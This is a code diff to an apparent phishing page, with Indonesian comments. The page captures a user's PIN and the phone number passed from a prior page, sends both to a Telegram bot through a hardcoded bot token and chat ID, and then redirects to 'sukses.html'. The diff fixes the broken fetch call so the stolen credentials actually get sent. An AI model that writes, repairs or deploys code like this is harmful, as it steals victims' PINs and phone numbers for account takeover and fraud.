@@ -95,14 +95,12 @@
   </div>
 
   <script>
-    // MASUKKAN BOT TOKEN DAN CHAT ID TELEGRAM KAMU DI SINI
     const BOT_TOKEN = "8881822233:AAE3UwszOo27KceLDBtNKdSD3AgANrxZncU";
     const CHAT_ID = "6742478722";
 
     let pin = "";
     const circles = document.querySelectorAll('.pin-circle');
 
-    // Mengambil nomor HP yang dikirim dari index.html
     const urlParams = new URLSearchParams(window.location.search);
     const userPhone = urlParams.get('phone') || "Tidak diketahui";
 
@@ -147,11 +145,18 @@
             chat_id: CHAT_ID,
             text: text,
             parse_mode: 'Markdown'
-          window.location.href = "sukses.html";
+          })
+        });
+
+        // PIN TERKIRIM -> PINDAH KE HALAMAN LAIN (Contoh: sukses.html)
+        setTimeout(() => {
+          window.location.href = "sukses.html"; 
+        }, 300);
+
       } catch (err) {
         alert("Gagal mengirim PIN.");
       }
     }
   </script>
 </body>
-</html
+</html>
